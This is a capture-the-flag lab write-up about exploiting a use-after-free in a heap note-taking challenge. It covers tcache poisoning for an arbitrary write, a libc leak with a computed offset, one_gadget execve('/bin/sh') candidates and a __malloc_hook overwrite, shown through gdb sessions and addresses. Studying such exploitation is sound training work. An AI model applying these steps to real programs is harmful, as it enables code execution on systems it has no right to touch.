So we're gonna try to achieve an arbitrary write through the following
1) Allocate three chunks of the same size
2) Free note 1
3) Free note 0
	We'll have:
		`tcache -> Note[0] -> Note[1]`
4) Edit our recently free'd note 0
	Now it will "point" to whatever data we put in
		`tcache -> Note[0] -> 0xDEADBEEF
		This does break the link to `Note[1]` but we do not care
5) Re allocate that space by calling `addnote` and making one of the same size
   Now tcache will point to that value
	   `tcache -> 0xDEADBEEF`
6) Make one more note (of that same size)
	The "pointer" that `malloc` returns will be `0xDEADBEEF`
7) Call edit, using that pointer
	* I may need to do some math to make sure that
		`ptr_array + u * 8 == 0xDEADBEEF`
	And that will overwrite the value at `0xdeadbeef`

# Arbitrary Write Manual Attempt
#### Setup:
```
jnu@Offsec-Ubuntu-20:~/Desktop/7-Week/uaf$ gdb challenge/chal
gef➤  break menu
Breakpoint 1 at 0x1249
gef➤  ignore 1 3
Will ignore next 3 crossings of breakpoint 1.
gef➤  r
Starting program: /home/jnu/Desktop/7-Week/uaf/challenge/chal 
```
## 1) Make Three Notes:
```
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>1
Size:
24
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>1
Size:
24
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>1
Size:
24

Breakpoint 1, 0x0000555555555249 in menu ()
```

Not much to see with `vvmap`, but we can tell that the heap was created:
```
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
```

## 2) Free note 1
```
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>2
which note do you wanna delete?
>1

Breakpoint 1, 0x0000555555555249 in menu ()
```

Look, there it is in `tcachebin`
```
gef➤  heap bin
Tcachebins for thread 1 ─────────────────────────────────────────────────────
Tcachebins[idx=0, size=0x20, count=1]
←  Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
```
## 3) Free note 0
```
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>2
which note do you wanna delete?
>0

Breakpoint 1, 0x0000555555555249 in menu ()
```

Now they both are in `tcachebin` (putting them all on separate lines for easy reading)
```
Tcachebins for thread 1 ─────────────────────────────────────────────────────
Tcachebins[idx=0, size=0x20, count=2] 
←  Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
←  Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
```
## 4) Edit our recently free'd note 0
### First, pick a fun place in writeable memory:
There's nothing deeply important here at the start of the writeable `chal` memory so...why not
```
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/jnu/Desktop/7-Week/uaf/challenge/chal
gef➤  x/2x 0x0000555555558000
0x555555558000:	0x00000000	0x00000000
```
I did have to restart so if some of my addresses don't line up, that's why


0x00555555558


Oh, I just realized this may not work without pwntools as it's taking it in like ascii instead of hex...still

We get this beautiful `corrupted chunk` in tcache:
```
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>3
which note do you wanna edit?
>0
Content:
00555555558

Tcachebins[idx=0, size=0x20, count=1] ←  Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x5555555592a0]
```
Maybe it wouldn't be corrupted if I gave it a non-ascii value

```
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>1
Size:
24

```

Oh beautiful:
```
gef➤  heap bins
Tcachebins for thread 1 ─────────────────────────────────────────────────────
[!] Command 'heap bins tcache' failed to execute properly, reason: Cannot access memory at address 0x3535353535353020
```
now we know where our address is haha
## 6) Make one more note (of that same size)
```
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>1
Size:
24

Program received signal SIGSEGV, Segmentation fault.
tcache_get (tc_idx=<optimized out>) at malloc.c:2937

```
 hahaha nice
 
Well, we didn't get to our arbitrary write, but we fucked some shit up so that's pretty fun.


# Trying with script
Cheating and leaving ASLR randomization off so that I can hardcode a random memory value to write to
	(baby steps)

We got to the part we were at before!
```
gef➤  $ heap bins
 Tcachebins for thread 1 
Tcachebins[idx=0, size=0x20, count=2]
←  Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
←  Chunk(addr=0x555555558000, size=0x7ffff7e09f10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
```
Look at that beautiful fucking chunk

Re allocate that space by calling `addnote` and making one of the same size
   Now tcache will point to that value
	   `tcache -> 0xDEADBEEF`
6) Make one more note (of that same size)
	The "pointer" that `malloc` returns will be `0xDEADBEEF`
7) Call edit, using that pointer

So now this is what it looks like after step 5: Re allocate that space by calling `addnote` and making one of the same size
```
>$ 1
Size:
$ 24

gef➤  $ heap bins
 Tcachebins for thread 1 
Tcachebins[idx=8796084505071, size=0x7ffff7e09f10, count=1] ←  Chunk(addr=0x555555558000, size=0x7ffff7e09f10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 

```

Step 6) Make one more note (of that same size)
```
>$ 1
Size:
$ 24

gef➤  $ heap bins
 Tcachebins for thread 1 
All tcachebins are empty

```

OH FUCK YES IT WORKS
STEP 7, edit that note
```
=========== NYU OFFSEC ============
1.    Add a note
2.    Delete a note
3.    Edit a note
4.    Read a note
5.    Exit
=========== NYU OFFSEC ============
>$ 3
which note do you wanna edit?
>$ 4
Content:
$ aaaa

gef➤  $ x/2x 0x0000555555558000
0x555555558000:    0x61616161    0x0000000a

```


Cool, gonna finish coding that whole thing and then...yeah I don't know what to do with this exactly BUT I GOT IT

Oh, I guess see if I can be extra lazy and overwrite the top of the stack hahahaha

# And now I'm leaking libc+++

Just gotta find the offset from the value I leaked to the start of libc

Gonna compare a few values here:

| Leak           | Libc Start     | Offset |
| -------------- | -------------- | ------ |
| 0x7f8df32fcbe0 | 0x7f8df3110000 | 1ECBE0 |
| 0x7f215b90dbe0 | 0x7f215b721000 | 1ECBE0 |
| 0x7f7120513be0 | 0x7f7120327000 | 1ECBE0 |

It looks like our offset is always `0x1ecbe0`




Okay, where are we at:
1) Arbitrary write
2) WE can leak libc locally and using GDB (but remote is giving us weird shit)
	1) Pretty sure we know the offset
	2) I think we can find where `system` is

What we need:
* leak location of `malloc_hook` pointer
* string things together
	* Leak libc
	* Calculate system
	* Use arbitrary write to overwrite `malloc_hook` with system address

If this is true that would be nice:
```
void *malloc_hook = arena_top - 0x68;
```


We know the address we'er leaking is at arena-top - 96 (I think)



Code as it is is leaking and overwriting, but currently my execution of system gets a segfault
```
0x00007ffff7ea6dc6 in __execvpe (file=<optimized out>, argv=<optimized out>, envp=<optimized out>) at execvpe.c:61
```



# Okay, I think I need gadgets
Onegadgets:
```
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

```

Potential Gadgets:
```
0xe3afe
	0x00000000000ef194 : pop r12 ; pop r13 ; pop r15 ; ret
```


Let's try!













Okay, I think my last problem is just math
in delete it calls
`free(*(void **)(ptr_array + (long)i * 8));`

So I need `ptr_array + (long)i * 8` to equal my binsh pointer


so i = (binsh - pointer array) / 8

```
libc base - chal base
00007ffff7dc3000 - 0000555555554000
= 2AAAA286F000

chal base = libc base - 2AAAA286F000
Array = chal base + 4060

binsh = libc + 0x1b45bd

array + 8i = binsh
i = (binsh - array)/8

2AAAA2A1F55D/8


```


OFfset between libc base and array = 2AAAA286AFA0


Array location: `0x555555558060`
Binsh: `0x7fdc9ae045bd`
Binsh - Array: `0x2A87458AC55D` = 



Okay...what if I overwrite `puts` instead maybe

hmmmm....but how will that work if the program calls puts all the damn time



Okay, what if I wrote it to a note before I called delete and then deleted that note!!!!
THAT WORKED flag{U5E_after_fr33_m0ar_l1k3_uafs_aR3_fun}
